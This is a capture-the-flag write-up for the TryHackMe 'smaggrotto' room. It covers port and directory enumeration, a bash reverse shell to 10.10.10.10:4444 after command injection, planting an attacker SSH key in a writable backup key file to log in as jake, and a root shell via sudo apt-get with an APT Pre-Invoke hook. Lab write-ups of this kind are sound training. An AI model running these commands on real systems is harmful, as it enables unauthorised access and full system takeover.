## smaggrotto
https://tryhackme.com/room/smaggrotto

## Enum
```
nmap -Pn -sC -sV -sS 10.10.140.10 -vv -T4
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDORe0Df8XvRlc3MvkqhpqAX5/sbUoEiIckKSVOLJVmWb9jOq2r0AfjaYAAZzgH9RThlwbzjGj6r4yBsXrMFB01qemsYBzUkut9Q12P+uly9+SeL6X7CUavLnkcAz0bzkqQpIFLG9HUyu9ysmZqE1Xo6NumtNh3Bf4H1BbS+cRntagn1TreTWJUiT+s7Gr9KEIH7rQUM8jX/eD/zNTKMN9Ib6/TM7TkPxAnOSw5JRfTV/oC8fFGqvjcAMxlhqS44AL/ZziI50OrCX9rMKtjZuvPaW2U31Sr8nUmtd3jnJPjMH2ZRfeRTPybYOblPOZq5lV2Fu4TwF/xOv2OrACLDxj5
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN6hWP9VGah8N9DAM3Kb0OZlIEttMMjf+PXwLWfHf0dz6OtdbrEjblgrck0i7fT95F1qdRJHtBdEu5yg4r6/gkY=
|   256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWHQ800Vx/X5aGSIDdpkEuKgFDxnjak46F/IsegN2Ju
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
ffuf -u http://smag.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
```
.hta                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 432ms]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 3048ms]
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 5185ms]
index.php               [Status: 200, Size: 402, Words: 69, Lines: 13, Duration: 301ms]
mail                    [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 325ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 310ms]
:: Progress: [4713/4713] :: Job [1/1] :: 130 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
```
![image](https://user-images.githubusercontent.com/6504854/185596553-fdf7e370-a5c9-44a0-b4e8-402da6bc7ac5.png)

![image](https://user-images.githubusercontent.com/6504854/185596651-d121de38-a8f0-4745-9f36-85eed03b8793.png)

![image](https://user-images.githubusercontent.com/6504854/185596726-dea57b8c-54be-492d-bfd7-ad9e5c198f04.png)

![image](https://user-images.githubusercontent.com/6504854/185596999-8fb87c11-0a92-4234-a16f-a9f4b3160b96.png)

![image](https://user-images.githubusercontent.com/6504854/185597181-474b6e66-d724-464e-b51b-fe3b5b638503.png)

![image](https://user-images.githubusercontent.com/6504854/185597637-2d18c160-c8e1-43eb-b844-c1f0463c3e8b.png)

![image](https://user-images.githubusercontent.com/6504854/185597959-abcf5303-2341-48dc-913d-5d46e82573ec.png)

![image](https://user-images.githubusercontent.com/6504854/185600982-93191c3e-3277-43ab-a461-38f6b56779a6.png)
![image](https://user-images.githubusercontent.com/6504854/185601154-96a54090-a4f9-4db2-89fe-a46e665520b1.png)

🏴 No response but it's sure to work command injection.

```
bash -c 'sh -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

![image](https://user-images.githubusercontent.com/6504854/185599033-c725d323-0a71-4062-a9d0-7d5f3f2c95ea.png)

🏴 It worked revers-shell.OK!

## Flag
I runned linpeas and found /opt/.backups/jake_id_rsa.pub.backup contains jake's key. 

![image](https://user-images.githubusercontent.com/6504854/185606932-45739dad-165f-4f9c-bad4-63399de08be4.png)

```
┌──(kali)-[~]
└─$ ssh-keygen -f jake_key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in jake_key
Your public key has been saved in jake_key.pub

┌──(kali)-[~]
└─$ cat jake_key.pub
ssh-rsa AAAAB3NzaC1...Yp0RSnZVB1vYlTApTKG4M=
```

```
www-data@smag:/home/jake$ echo 'ssh-rsa AAAAB3NzaC1...Yp0RSnZVB1vYlTApTKG4M=' > /opt/.backups/jake_id_rsa.pub.backup
```

```
┌──(kali)-[~]
└─$ ssh jake@10.10.140.10 -i jake_key
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020

jake@smag:~$ cat user.txt

jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get

jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# cat /root/root.txt
```

Thank you for your time. Happy Hacking! 😄
